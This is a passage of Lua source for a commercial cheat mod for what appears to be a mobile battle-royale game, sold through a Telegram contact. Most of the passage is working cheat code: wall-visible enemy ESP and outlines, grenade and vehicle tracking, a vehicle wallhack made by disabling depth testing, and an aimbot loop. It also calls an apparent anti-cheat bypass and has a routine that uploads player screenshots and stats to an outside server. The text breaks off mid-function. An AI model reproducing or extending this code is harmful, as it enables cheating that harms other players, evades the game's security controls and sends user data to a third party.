                nameColor = bIsVisible and visibleCol or invisibleCol
            end

            -- State cache: sirf tab call karo jab kuch badla ho
            local nameKey = pName .. (isKnock and "K" or "") .. (bIsVisible and "V" or "I")
            if markData.NameLastKey ~= nameKey then
                markData.NameLastKey = nameKey
                hud:AddDebugText(pName, enemy, 0.2, {X=0, Y=0, Z=120}, {X=0, Y=0, Z=120},
                                 nameColor, true, false, true, nil, 1.0, true)
            else
                -- Refresh display without re-computing (AddDebugText needs periodic call to stay visible)
                hud:AddDebugText(pName, enemy, 0.15, {X=0, Y=0, Z=120}, {X=0, Y=0, Z=120},
                                 nameColor, true, false, true, nil, 1.0, true)
            end
        end)
    end
end

                    -- RED HEALTH BAR (mark 1006) REMOVE kar diya -- ab sirf distance mark (diamond + m).
                    -- Health bar ab green wala (PREMIUM ke saath ESP.Update se) dikhta hai.
                    if markData.hpMark then SafeRemoveMark(markData.hpMark); markData.hpMark = nil end
                    if CFGM.EspVip then
                        -- [v5.5] diamond+meter mark ab 360m tak (hysteresis 375m). Pehle sirf 100m (115m) tha.
                        -- Jo enemy game ki list mein hi nahi aate (door wale) unhe ESP engine se mark milta hai (ESP.SyncVipMark).
                        local wantMark = distM <= 360 or (markData.distMark ~= nil and distM <= 375)
                        if wantMark then
                            if markData.distMark == nil then markData.distMark = SafeAddMark(9999, FVector(0,0,0), 0, "", 4, enemy) end
                        elseif markData.distMark then
                            SafeRemoveMark(markData.distMark); markData.distMark = nil
                        end
                    else
                        if markData.distMark then SafeRemoveMark(markData.distMark); markData.distMark = nil end
                    end

                    -- Esp8 (Head HP Bar) hata diya gaya: koi menu button nahi tha.
                    -- Purane marks agar bache hain to saaf kar do.
                    if markData.hpMark8 then SafeRemoveMark(markData.hpMark8); markData.hpMark8 = nil end
                    
                    if CFGM.EspRadar then
                        if not markData.radarMark or markData.radarMark == 0 then 
                            markData.radarMark = SafeAddMark(8888, FVector(0,0,0), 0, "", 4, enemy) 
                        end
                    else
                        if markData.radarMark and markData.radarMark ~= 0 then
                            SafeRemoveMark(markData.radarMark)
                            markData.radarMark = nil
                        end
                    end
                    
                    if CFGM.EspOutline then
                        pcall(function()
                            local outlineHash = tostring(CFGM.OutlineThickness)
                            if markData.OutlineState ~= outlineHash then
                                local PPM = Cached_PPM
                                local avatarComp = (type(enemy.getAvatarComponent2) == "function") and enemy:getAvatarComponent2() or nil
                                if Valid(avatarComp) and Valid(PPM) then
                                    PPM.OutlineThickness = CFGM.OutlineThickness
                                    if PPM.OutlineColor then PPM.OutlineColor = {r = 1, g = 0, b = 0, a = 1} end
                                    PPM:EnableAvatarOutline(avatarComp, true)
                                    markData.OutlineState = outlineHash
                                end
                            end
                        end)
                    else
                        pcall(function()
                            if markData.OutlineState ~= "OFF" then
                                local PPM = Cached_PPM
                                local avatarComp = (type(enemy.getAvatarComponent2) == "function") and enemy:getAvatarComponent2() or nil
                                if Valid(avatarComp) and Valid(PPM) then PPM:EnableAvatarOutline(avatarComp, false) end
                                markData.OutlineState = "OFF"
                            end
                        end)
                    end

                else
                    if not markData.IsCleanedUp then
                        SafeRemoveMark(markData.radarMark)
                        markData.radarMark = nil
                        SafeRemoveMark(markData.hpMark)
                        markData.hpMark = nil
                        SafeRemoveMark(markData.hpMark8)
                        markData.hpMark8 = nil
                        SafeRemoveMark(markData.distMark)
                        markData.distMark = nil
                        
                        if markData.MIDs then
                            for meshStr, midTable in pairs(markData.MIDs) do
                                for k, _ in pairs(midTable) do midTable[k] = nil end
                            end
                            markData.MIDs = nil
                        end
                        
                        pcall(function()
                            local eObj = markData.enemy
                            if Valid(eObj) then 
                                if eObj.Replay_SetVisiableOfFrameUI then eObj:Replay_SetVisiableOfFrameUI(false) end
                                local uiComp = eObj.EnemyFrameUI or (type(eObj.GetEnemyFrameUI) == "function" and eObj:GetEnemyFrameUI())
                                if Valid(uiComp) then
                                    if type(uiComp.SetVisibility) == "function" then uiComp:SetVisibility(2) end 
                                    if type(uiComp.SetHiddenInGame) == "function" then uiComp:SetHiddenInGame(true) end
                                end
                            end
                            
                            local PPM = Cached_PPM
                            local avatarComp = Valid(eObj) and (type(eObj.getAvatarComponent2) == "function") and eObj:getAvatarComponent2() or nil
                            if Valid(avatarComp) and Valid(PPM) then PPM:EnableAvatarOutline(avatarComp, false) end
                        end)

                        markData.IsCleanedUp = true
                    end
                end
            end

            -- ---------------------------------------------------------------- ek pawn ka poora step
            local function pawnStep(enemy)
                if not Valid(enemy) or enemy == localPlayer then return 0.2 end
                local eKey = enemy.PlayerKey                                          -- GetSafeEnemyKey jaisa hi, Valid/read dohra nahi
                if eKey then eKey = tostring(eKey)
                elseif type(enemy.GetUniqueID) == "function" then eKey = tostring(enemy:GetUniqueID())
                else eKey = tostring(enemy) end
                seenKeys[eKey] = true

                local tid = enemy.TeamID
                if tid == myTeamRaw then return 0.3 end                               -- apni team: kuch nahi

                Sx.d, Sx.done = nil, false
                local okh, hs = pcall(readHS, enemy)
                if not okh then hs = nil end

                pcall(enemyBody, enemy, eKey, hs)
                return 1
            end

            -- ---------------------------------------------------------------- pass poora: cleanup
            local function finishPass()
                if ST.EnemyJob == J then ST.EnemyJob = nil end
                -- jo enemy ab game ki list mein nahi unke marks / caches saaf (pehle ye tick ke shuru mein hota tha).
                -- Exception: ESP engine (360m) jise abhi bhi track kar raha hai (door wala enemy) uske radar / diamond marks
                -- engine ke hain -- unhe yahan hatate to har pass (~0.5 s) par blink hota. Engine unhe khud hatata hai
                -- (enemy mara / 360m se bahar / premium off); engine ke chhodne ke baad agla pass baaki saaf kar deta hai.
                local E = _G.PMM_ESPV2
                local eSeen, eGen = E and E._seen, E and E._gen
                for key, data in pairs(_G.GTLMODState.EnemyMarks) do
                    if not seenKeys[key] then
                        local espOwns = (eSeen ~= nil and eGen ~= nil and eSeen[key] == eGen)
                        SafeRemoveMark(data.hpMark)
                        if not espOwns then
                            SafeRemoveMark(data.radarMark)
                            SafeRemoveMark(data.distMark)
                        end

                        if _G.AimTouchVisCache and _G.AimTouchVisCache[key] then
                            _G.AimTouchVisCache[key] = nil
                        end

                        if _G.BotStatusCache and _G.BotStatusCache[key] then
                            _G.BotStatusCache[key] = nil
                        end

                        if data.MIDs then
                            for meshStr, midTable in pairs(data.MIDs) do
                                for k, _ in pairs(midTable) do
                                    midTable[k] = nil
                                end
                            end
                            data.MIDs = nil
                        end

                        if espOwns then
                            -- baaki sab state (wallhack / frame-UI wagairah) pehle ki tarah saaf; sirf engine ke marks bache rehte hain
                            for k in pairs(data) do
                                if k ~= "enemy" and k ~= "radarMark" and k ~= "distMark" and k ~= "lastEnemyActor" then
                                    data[k] = nil
                                end
                            end
                        else
                            data.enemy = nil
                            data.CachedMeshes = nil
                            _G.GTLMODState.EnemyMarks[key] = nil
                        end
                    end
                end
            end

            -- ---------------------------------------------------------------- slices: har frame thode enemy
            local per = math.ceil(nP / 8)
            if per < 3 then per = 3 elseif per > 10 then per = 10 end
            local runSlice
            local function sliceBody()
                if ST.EnemyJob ~= J then return end                                 -- naya pass / world badal gaya: ye band
                if not Valid(localPlayer) then ST.EnemyJob = nil return end
                local used = 0
                while J.i < J.n and used < per do
                    J.i = J.i + 1
                    local okS, w = pcall(pawnStep, J.pawns[J.i])
                    used = used + ((okS and tonumber(w)) or 1)
                end
                if J.i < J.n then
                    local tk = GetTicker()
                    if tk and tk.AddTimerOnce then tk.AddTimerOnce(0.016, runSlice) return end
                    while J.i < J.n do                                              -- ticker nahi mila: baaki abhi
                        J.i = J.i + 1
                        pcall(pawnStep, J.pawns[J.i])
                    end
                end
                pcall(finishPass)
            end
            runSlice = function()
                if not pcall(sliceBody) and ST.EnemyJob == J then ST.EnemyJob = nil end
            end
            runSlice()
        end

        -- ==========================================================
        -- GRANDE WARNING ESP (grenades on ground + enemy holding/throwing)
        -- ==========================================================
        if CFGM.EspBomMaster and (CFGM.EspItemBom or CFGM.EspActiveBom) then
            pcall(function()
                local MyHUD = Cached_MyHUD
                if not Valid(MyHUD) then return end

                if not _G.CachedGameplayStatics then _G.CachedGameplayStatics = import("GameplayStatics") end
                if not _G.CachedActorClass_ForBomb then _G.CachedActorClass_ForBomb = import("Actor") end
                if not _G.CachedProjArray then _G.CachedProjArray = slua.Array(UEnums.EPropertyClass.Object, _G.CachedActorClass_ForBomb) end

                -- Weak tables: game khud rubbish saaf karta hai, RAM nahi bharti
                if not _G.ActorBombCacheInit then
                    _G.NonBombCache = setmetatable({}, { __mode = "k" })
                    _G.BombCache = setmetatable({}, { __mode = "k" })
                    _G.ActorBombCacheInit = true
                end

                local ui_util = GetUIUtil()
                local gameInstance = ui_util and ui_util.GetGameInstance()
                if not (gameInstance and _G.CachedGameplayStatics) then return end

                local curTime = os.clock()

                -- Heavy scan sirf 0.5s mein ek baar
                if not _G.LastBombScanTime or (curTime - _G.LastBombScanTime) > 0.5 then
                    _G.LastBombScanTime = curTime
                    local allActors = _G.CachedGameplayStatics.GetAllActorsOfClass(gameInstance, _G.CachedActorClass_ForBomb, _G.CachedProjArray)

                    local activeBombs = {}
                    local itemBombs = {}

                    if allActors then
                        for _, actor in pairs(allActors) do
                            if slua.isValid(actor) and not actor.bHidden and not actor.bTearOff then
                                if not _G.NonBombCache[actor] then
                                    local bType = 0
                                    local isItem = false
                                    local isKnownBomb = _G.BombCache[actor]

                                    if isKnownBomb then
                                        bType = isKnownBomb.type
                                        isItem = isKnownBomb.isItem
                                    else
                                        local nameLower = nil
                                        pcall(function() nameLower = string.lower(type(actor.GetName) == "function" and actor:GetName() or tostring(actor)) end)

                                        if nameLower then
                                            if string.find(nameLower, "m79") or string.find(nameLower, "launcher") then bType = 5
                                            elseif string.find(nameLower, "smoke") then bType = 2
                                            elseif string.find(nameLower, "burn") or string.find(nameLower, "molotov") then bType = 3
                                            elseif string.find(nameLower, "flash") or string.find(nameLower, "stun") then bType = 4
                                            elseif string.find(nameLower, "grenade") then bType = 1 end

                                            if bType > 0 then
                                                if string.find(nameLower, "projectile") or string.find(nameLower, "thrown") then
                                                    isItem = false
                                                else
                                                    isItem = true
                                                    local shouldAdd = true
                                                    if bType == 3 and not (string.find(nameLower, "pickup") or string.find(nameLower, "wrapper") or string.find(nameLower, "weapon")) then
                                                        shouldAdd = false
                                                    elseif bType == 5 then
                                                        local attachParent = nil
                                                        pcall(function() if type(actor.GetAttachParentActor) == "function" then attachParent = actor:GetAttachParentActor() end end)
                                                        if slua.isValid(attachParent) then
                                                            local isHolding = false
                                                            pcall(function()
                                                                local curWeapon = type(attachParent.GetCurrentWeapon) == "function" and attachParent:GetCurrentWeapon() or attachParent.CurrentWeapon
                                                                if curWeapon == actor then isHolding = true end
                                                            end)
                                                            if not isHolding then shouldAdd = false end
                                                        end
                                                    end
                                                    if not shouldAdd then bType = 0 end
                                                end
                                            end
                                        end

                                        if bType > 0 then
                                            _G.BombCache[actor] = { type = bType, isItem = isItem }
                                        else
                                            _G.NonBombCache[actor] = true
                                        end
                                    end

                                    if bType > 0 then
                                        local isPendingKill = false
                                        pcall(function() if type(actor.IsPendingKill) == "function" then isPendingKill = actor:IsPendingKill() end end)

                                        if not isPendingKill then
                                            if isItem then
                                                table.insert(itemBombs, {act = actor, type = bType})
                                            else
                                                table.insert(activeBombs, {act = actor, type = bType})
                                            end
                                        else
                                            _G.BombCache[actor] = nil
                                        end
                                    end
                                end
                            end
                        end
                    end
                    _G.CachedActiveBombs = activeBombs
                    _G.CachedItemBombs = itemBombs
                end

                local curGameTime = 0
                pcall(function() curGameTime = _G.CachedGameplayStatics.GetTimeSeconds(gameInstance) end)

                local function DrawBombs(bombList, isItem, maxDist)
                    if not bombList then return end
                    for _, item in ipairs(bombList) do
                        local bomb = item.act
                        local bType = item.type

                        if slua.isValid(bomb) and not bomb.bHidden then
                            local distM = 0
                            pcall(function() distM = localPlayer:GetDistanceTo(bomb) / 100 end)

                            if distM > 0 and distM <= maxDist then
                                local displayName = ""
                                local bombColor = C_WHITE
                                local zOffset = isItem and 15 or 25

                                if bType == 1 then displayName = "GRENADE"; bombColor = isItem and {R=255, G=100, B=100, A=255} or C_RED
                                elseif bType == 2 then displayName = "SMOKE"; bombColor = isItem and {R=200, G=200, B=200, A=255} or C_WHITE
                                elseif bType == 3 then displayName = "MOLOTOV"; bombColor = isItem and {R=255, G=160, B=50, A=255} or {R=255, G=100, B=0, A=255}
                                elseif bType == 4 then displayName = "FLASH"; bombColor = isItem and {R=150, G=255, B=255, A=255} or C_CYAN
                                elseif bType == 5 then displayName = "LAUNCHER"; bombColor = isItem and {R=150, G=255, B=150, A=255} or {R=100, G=255, B=100, A=255} end

                                local text = string.format("%s [%dm]", displayName, math.floor(distM))
                                local shouldTimerRun = not isItem

                                if isItem then
                                    pcall(function()
                                        if bomb.bIsPinPulled or bomb.bPinPulled or (type(bomb.IsPinPulled) == "function" and bomb:IsPinPulled()) then shouldTimerRun = true end
                                    end)
                                end

                                if shouldTimerRun and curGameTime > 0 then
                                    local timeLeft = -1
                                    pcall(function()
                                        if bomb.ExplosionTime then timeLeft = bomb.ExplosionTime - curGameTime
                                        elseif bomb.ExplodeTime then timeLeft = bomb.ExplodeTime - curGameTime end
                                    end)

                                    if timeLeft == -1 or timeLeft > 100 then
                                        _G.ActiveBombTimers = _G.ActiveBombTimers or {}
                                        local bombId = tostring(bomb)
                                        if not _G.ActiveBombTimers[bombId] then _G.ActiveBombTimers[bombId] = curGameTime end
                                        local elapsed = curGameTime - _G.ActiveBombTimers[bombId]
                                        local maxTime = (bType == 1 and 7.0) or (bType == 2 and 45.0) or (bType == 3 and 12.0) or (bType == 4 and 5.0) or 45.0
                                        timeLeft = maxTime - elapsed
                                    end

                                    if timeLeft < 0 then timeLeft = 0 end
                                    if timeLeft > 0.1 then text = string.format("%s (%.1fs)", text, timeLeft) end
                                end

                                local dynamicScale = math.max(0.6, 1.1 - (distM / maxDist))
                                MyHUD:AddDebugText(text, bomb, 0.5, {X=0, Y=0, Z=zOffset}, {X=0, Y=0, Z=zOffset}, bombColor, true, false, true, nil, dynamicScale, true)
                            end
                        end
                    end
                end

                if not _G.LastClearTimer or (curTime - _G.LastClearTimer) > 1.0 then
                    _G.LastClearTimer = curTime
                    pcall(function()
                        if _G.ActiveBombTimers then
                            for k, v in pairs(_G.ActiveBombTimers) do
                                if (curGameTime - v) > 60.0 then _G.ActiveBombTimers[k] = nil end
                            end
                        end
                    end)
                end

                if CFGM.EspItemBom then DrawBombs(_G.CachedItemBombs, true, 50) end
                if CFGM.EspActiveBom then DrawBombs(_G.CachedActiveBombs, false, 150) end
            end)
        end

        -- ==========================================================
        -- VEHICLE SYSTEM (SHARED SCAN) -- Wallhack + ESP dono isi ek scan
        -- se chalte hain. Pehle dono apna alag GetAllActorsOfClass chalate the,
        -- yani dono ON hone par har second DO full scans. Ab sirf EK.
        -- ==========================================================
        if CFGM.WallVehicle or CFGM.EspVehicle then
            pcall(function()
                local curTime = os.clock()

                if not _G.CachedGameplayStatics then _G.CachedGameplayStatics = import("GameplayStatics") end
                if not _G.CachedActorClass_ForVehicle then _G.CachedActorClass_ForVehicle = import("STExtraVehicleBase") end
                if not _G.CachedVehicleArray then _G.CachedVehicleArray = slua.Array(UEnums.EPropertyClass.Object, _G.CachedActorClass_ForVehicle) end

                local ui_util = GetUIUtil()
                local gameInstance = ui_util and ui_util.GetGameInstance()
                if not (gameInstance and _G.CachedGameplayStatics) then return end

                -- ---------- SHARED SCAN: 1s mein ek baar ----------
                if not _G.LastVehicleScanTime or (curTime - _G.LastVehicleScanTime) > 1.0 then
                    _G.LastVehicleScanTime = curTime
                    local allVehicles = _G.CachedGameplayStatics.GetAllActorsOfClass(gameInstance, _G.CachedActorClass_ForVehicle, _G.CachedVehicleArray)

                    local activeVehicles = {}
                    if allVehicles then
                        for _, veh in pairs(allVehicles) do
                            if slua.isValid(veh) and not veh.bHidden and not veh.bTearOff then
                                local isPendingKill = false
                                pcall(function() if type(veh.IsPendingKill) == "function" then isPendingKill = veh:IsPendingKill() end end)

                                if not isPendingKill then
                                    local vehName = "Vehicle"
                                    local hasDriver = false

                                    pcall(function()
                                        if type(veh.GetVehicleName) == "function" then vehName = veh:GetVehicleName()
                                        elseif veh.VehicleName then vehName = veh.VehicleName end
                                        local driver = type(veh.GetDriver) == "function" and veh:GetDriver() or nil
                                        if slua.isValid(driver) then hasDriver = true end
                                    end)

                                    local nameLower = string.lower(tostring(vehName) .. tostring(veh))
                                    local displayName = "Vehicle"
                                    if string.find(nameLower, "uaz") then displayName = "UAZ"
                                    elseif string.find(nameLower, "dacia") then displayName = "Dacia"
                                    elseif string.find(nameLower, "buggy") then displayName = "Buggy"
                                    elseif string.find(nameLower, "mirado") then displayName = "Mirado"
                                    elseif string.find(nameLower, "bike") or string.find(nameLower, "motor") then displayName = "Motor"
                                    elseif string.find(nameLower, "scooter") then displayName = "Scooter"
                                    elseif string.find(nameLower, "coupe") then displayName = "Coupe RB"
                                    elseif string.find(nameLower, "brdm") then displayName = "BRDM"
                                    elseif string.find(nameLower, "boat") or string.find(nameLower, "aquarail") then displayName = "Boat"
                                    elseif string.find(nameLower, "glider") then displayName = "Glider"
                                    else displayName = "Veh (" .. string.sub(tostring(vehName), 1, 8) .. ")" end

                                    table.insert(activeVehicles, {act = veh, name = displayName, hasDriver = hasDriver})
                                end
                            end
                        end
                    end
                    _G.CachedVehicles = activeVehicles
                end

                if not _G.CachedVehicles then return end
                local MyHUD = Cached_MyHUD

                -- ---------- WALLHACK: material sirf EK BAAR per gaadi ----------
                if CFGM.WallVehicle then
                    _G.AppliedVehicleWall = _G.AppliedVehicleWall or {}
                    for _, item in ipairs(_G.CachedVehicles) do
                        local vehicle = item.act
                        if slua.isValid(vehicle) and type(vehicle.GetMesh) == "function" then
                            local vId = tostring(vehicle)
                            if not _G.AppliedVehicleWall[vId] then
                                local dist = 0
                                pcall(function() dist = localPlayer:GetDistanceTo(vehicle) end)
                                if dist > 0 and dist <= 200000 then   -- 200m
                                    pcall(function()
                                        local mesh = vehicle:GetMesh()
                                        if slua.isValid(mesh) then
                                            local matInterface = mesh:GetMaterial(0)
                                            if slua.isValid(matInterface) then
                                                local baseMat = matInterface:GetBaseMaterial()
                                                if slua.isValid(baseMat) then
                                                    baseMat.bDisableDepthTest = true
                                                    baseMat.BlendMode = 2
                                                    _G.AppliedVehicleWall[vId] = true
                                                end
                                            end
                                        end
                                    end)
                                end
                            end
                        end
                    end
                elseif _G.AppliedVehicleWall and next(_G.AppliedVehicleWall) ~= nil then
                    -- OFF hone par cache saaf karo taake dobara ON par phir apply ho
                    _G.AppliedVehicleWall = {}
                end

                -- ---------- ESP: naam + distance text ----------
                if CFGM.EspVehicle and Valid(MyHUD) then
                    for _, item in ipairs(_G.CachedVehicles) do
                        local veh = item.act
                        if slua.isValid(veh) and not veh.bHidden then
                            local isShow = false
                            if item.name == "Dacia" then isShow = CFGM.EspVeh_Dacia
                            elseif item.name == "UAZ" then isShow = CFGM.EspVeh_UAZ
                            elseif item.name == "Buggy" then isShow = CFGM.EspVeh_Buggy
                            elseif item.name == "Coupe RB" then isShow = CFGM.EspVeh_Coupe
                            elseif item.name == "Mirado" then isShow = CFGM.EspVeh_Mirado
                            elseif item.name == "Motor" or item.name == "Scooter" then isShow = CFGM.EspVeh_Motor
                            else isShow = CFGM.EspVeh_Other end

                            if isShow then
                                local distM = 0
                                pcall(function() distM = localPlayer:GetDistanceTo(veh) / 100 end)

                                if distM > 0 and distM <= 300 then
                                    local text = string.format("%s [%dm]", item.name, math.floor(distM))
                                    local vehColor = item.hasDriver and {R=255, G=50, B=50, A=255} or {R=0, G=255, B=150, A=255}
                                    local dynamicScale = math.max(0.6, 1.1 - (distM / 500))
                                    MyHUD:AddDebugText(text, veh, 0.5, {X=0, Y=0, Z=50}, {X=0, Y=0, Z=50}, vehColor, true, false, true, nil, dynamicScale, true)
                                end
                            end
                        end
                    end
                end
            end)
        end

    end)
end

_G.GTLMODState.LoopToken = (_G.GTLMODState.LoopToken or 0) + 1 
local myToken = _G.GTLMODState.LoopToken

-- ========================================== 
-- MAIN LOOP: ESP & ALL FEATURES (every 0.4s)
-- ========================================== 
local function FastTick() 
    if isExpired then 
        if not _G.GTLMODNotifiedExpire then
            Notify("MOD HAS EXPIRED! PLEASE CONTACT ADMIN TO RENEW!\nTelegram @DevLet")
            _G.GTLMODNotifiedExpire = true
            ExpiredTick() 
        end
        return 
    end

    if myToken ~= _G.GTLMODState.LoopToken then return end
    _G.GTLSafe("MainLoop", MainLoop)
    local ticker = GetTicker()
    if ticker and ticker.AddTimerOnce then
        -- MATCH LAG FIX: 2-3 players ke waqt (early game / near end)
        -- MainLoop slower chalao -- unnecessary processing kam hogi
        local nCached = #((_G.PMM_ESPV2 and _G.PMM_ESPV2.EnemyCache) or {})
        local loopDelay
        if nCached >= 18 then
            loopDelay = 0.6   -- zyada players = slow main loop
        elseif nCached <= 3 then
            loopDelay = 0.5   -- 2-3 players: early/end game, ghata do (less jitter)
        else
            loopDelay = 0.4   -- normal
        end
        ticker.AddTimerOnce(loopDelay, FastTick)
    end
end

-- ========================================== 
-- AIMBOT LOOP: high-frequency (~60 FPS / 0.016s)
-- ========================================== 
local aimbotToken = 0
local function FastAimbotTick()
    if isExpired then 
        return 
    end

    if aimbotToken ~= _G.GTLMODState.AimbotLoopToken then 
        return 
    end

    local fAim = _G.AimTouch   -- GTLSafe-wrapped, throw nahi karta; per-tick closure ab nahi banta
    if fAim and _G.GTLMODConfig.AimTouchEnable then fAim() end

    local ticker = GetTicker()
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.016, FastAimbotTick)
    end
end

-- ========================================== 
-- ESP V2 RENDER LOOP: high-frequency (~60 FPS / 0.016s)
-- Position/Line/Skeleton yahan real-time update hote hain -- MainLoop (0.4s) se
-- alag rakha gaya taake camera move karte hi lines turant follow karein, delay na ho
-- ========================================== 
local espv2Token = 0
local function FastESPV2Tick()
    if isExpired then
        return
    end

    if espv2Token ~= _G.GTLMODState.ESPV2LoopToken then
        return
    end

    local E = _G.PMM_ESPV2
    if E and E.bActive and _G.PMM_ESPV2_AnyOn() then
        pcall(E.Tick)         -- pcall(fn) => har frame naya closure nahi banta
    end

    -- Agla tick: ESP.Tick ka apna wall-clock gate hai (ESP.GateGapNow). Usse thoda pehle jagte hain taake
    -- gate ke baad pehle hi frame par Update chale, par har frame faltu jagna bhi nahi.
    local gap = (E and E.GateGapNow) or 0.016
    local nextDelay = gap - 0.008
    if nextDelay < 0.016 then nextDelay = 0.016 end
    if nextDelay > 0.060 then nextDelay = 0.060 end

    local ticker = GetTicker()
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(nextDelay, FastESPV2Tick)
    end
end

-- ========================================== 
-- IGNITE ALL LOOPS
-- ========================================== 
if not isExpired then
    _G.StartBypass_VIP_v3()
    FastTick() 
    _G.GTLMODState.AimbotLoopToken = (_G.GTLMODState.AimbotLoopToken or 0) + 1
    aimbotToken = _G.GTLMODState.AimbotLoopToken
    _G.GTLMODState.ESPV2LoopToken = (_G.GTLMODState.ESPV2LoopToken or 0) + 1
    espv2Token = _G.GTLMODState.ESPV2LoopToken
    local ticker = GetTicker()
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.1, FastAimbotTick)
        ticker.AddTimerOnce(0.1, FastESPV2Tick)
    end
    Notify("VINESH_OP VIP MOD Loaded! Open VINESH_OP MENU to toggle features.")
else
    FastTick() 
end

-- ===================================================================================
-- SYSTEM HOOKS BYPASS
-- ===================================================================================
local function InitAllModSystems()
    if isExpired then return end 

    local GameplayData = package.loaded["GameLua.GameCore.Data.GameplayData"] or require("GameLua.GameCore.Data.GameplayData")
    if not GameplayData then return end

    pcall(function()
        local LocalPlayer = GameplayData.GetPlayerCharacter and GameplayData.GetPlayerCharacter()
        if slua.isValid(LocalPlayer) then
            if LocalPlayer.bHasShownDevNotice == nil then
                LocalPlayer.bHasShownDevNotice = false 
                LocalPlayer.bHasShownExpiredNotice = false 
                LocalPlayer.bIsDeadFlag = false
            end
        end
    end)
end

if not isExpired then
    local ticker = GetTicker()
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.5, InitAllModSystems)
    end
end

-- =================================START==========================================
-- AUTO FEEDBACK SYSTEM (Telegram) - ALL RANKS SUPPORTED
-- ============================================================
-- AUTO FEEDBACK SYSTEM (Telegram) - ALL RANKS SUPPORTED
-- ============================================================
local AutoFeedback = {
	Config = {
		ServerURL = "https://long-recipe-0e92.devfantari.workers.dev/",
		TestMode = false
	},
	Hooked = false
}

local function AF_Log(message)
	print(string.format("[DevLet ][%s] %s", os.date("%H:%M:%S"), tostring(message)))
end

local function AF_Notify(message)
	if _G.SRCHUBNotify then
		pcall(_G.SRCHUBNotify, message)
	end
end

local function AF_GetModule(name, allowRequire)
	local loaded = package and package.loaded and package.loaded[name]
	if loaded then return loaded end
	if allowRequire == false then return nil end
	local ok, module = pcall(require, name)
	if ok then return module end
	return nil
end

local function AF_AddTimerOnce(delay, callback)
	local ticker = AF_GetModule("common.time_ticker")
	if ticker and type(ticker.AddTimerOnce) == "function" then
		ticker.AddTimerOnce(delay, callback)
		return true
	end
	return false
end

local function AF_Base64Encode(data)
	if type(data) ~= "string" or #data == 0 then return "" end
	local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local output = {}
	local outputIndex = 0
	local index = 1
	while index <= #data - 2 do
		local a, b, c = string.byte(data, index, index + 2)
		local value = a * 65536 + b * 256 + c
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
			string.byte(alphabet, value % 64 + 1)
		)
		index = index + 3
	end
	local remaining = #data - index + 1
	if remaining == 2 then
		local a, b = string.byte(data, index, index + 1)
		local value = a * 65536 + b * 256
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
			string.byte("=")
		)
	elseif remaining == 1 then
		local value = string.byte(data, index) * 65536
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte("="),
			string.byte("=")
		)
	end
	return table.concat(output)
end

local function AF_UrlEncode(value)
	if value == nil then return nil end
	value = tostring(value):gsub("\n", "\r\n")
	value = value:gsub("([^A-Za-z0-9 %-%_%.%~])", function(character)
		return string.format("%%%02X", string.byte(character))
	end)
	value = value:gsub(" ", "+")
	return value
end

local function AF_ReadFile(path)
	local file = io.open(path, "rb")
	if not file then return "" end
	local data = file:read("*a") or ""
	file:close()
	return data
end

local function AF_RemoveFile(path)
	pcall(os.remove, path)
end

local function AF_GetRankName(rank)
	if rank < 1700 then return "Bronze"
	elseif rank < 2200 then return "Silver"
	elseif rank < 2700 then return "Gold"
	elseif rank < 3200 then return "Platinum"
	elseif rank < 3700 then return "Diamond"
	elseif rank < 4200 then return "Crown"
	elseif rank < 4700 then return "Ace"
	elseif rank < 5200 then return "Ace Master"
	elseif rank < 5600 then return "Ace Dominator"
	end
	return "Conqueror"
end

local FeedbackCaptionTemplate = "<b>TELEGRAM [ @DevLet  ]</b>\n<pre>\nPlayer - %s\nUID    - %s\nTime   - %s\nKills  - %d\nRank   - %s\n</pre>\n[ ACTIVE - SAFE ]\n<b>Owner: DevLet</b>"

function AutoFeedback.SendFeedback(path, kills, rank, segment)
	AF_Log("Preparing to send feedback. Screenshot: " .. tostring(path))
	local ok, err = pcall(function()
		local httpManager = AF_GetModule("client.slua.logic.http.http_manager")
		if not httpManager or type(httpManager.Post) ~= "function" then
			AF_Log("HTTP manager is unavailable.")
			return
		end
		local attempts = 0
		local function TrySend()
			local imageData = AF_ReadFile(path)
			if #imageData > 0 then
				local uid = "unknown"
				if _G.DataMgr and _G.DataMgr.roleData and _G.DataMgr.roleData.uid then
					uid = tostring(_G.DataMgr.roleData.uid)
				elseif _G._KONG_UK then
					uid = tostring(_G._KONG_UK)
				end
				kills = tonumber(kills) or 0
				rank = tonumber(rank) or 0
				segment = tonumber(segment) or 0
				local maskedName = "*****"
				local maskedUid = "***"
				if uid ~= "unknown" and #uid > 5 then
					maskedUid = uid:sub(1, 3) .. "***" .. uid:sub(-2)
				end
				local caption = string.format(
					FeedbackCaptionTemplate,
					maskedName,
					maskedUid,
					os.date("%H:%M:%S %d/%m/%Y"),
					kills,
					AF_GetRankName(rank)
				)
				local encodedImage = AF_Base64Encode(imageData)
				encodedImage = encodedImage:gsub("%+", "%%2B")
				encodedImage = encodedImage:gsub("/", "%%2F")
				encodedImage = encodedImage:gsub("=", "%%3D")
				AF_Notify("[SRC_HUB] Uploading Top 1 screenshot to VIP Server...")
				-- bot_token and chat_id are supplied by the Worker (env secrets).
				-- Do NOT add them here — this script is public.
				local body = "base64_image=" .. encodedImage
					.. "&caption=" .. AF_UrlEncode(caption)
				httpManager:Post(
					AutoFeedback.Config.ServerURL,
					{["Content-Type"] = "application/x-www-form-urlencoded"},
					body,
					nil,
					function(success, _, response, errorMessage)
						if success and response and tostring(response):find('"status":%s*true') then
							AF_Notify("[SRC_HUB] Successfully sent! (Kills: " .. tostring(kills) .. ")")
						else
							local detail = tostring(response or errorMessage):sub(1, 40)
							AF_Notify("[SRC_HUB] VIP Server error: " .. detail)
						end
						AF_RemoveFile(path)
					end,
					60
				)
				return
			end
			attempts = attempts + 1
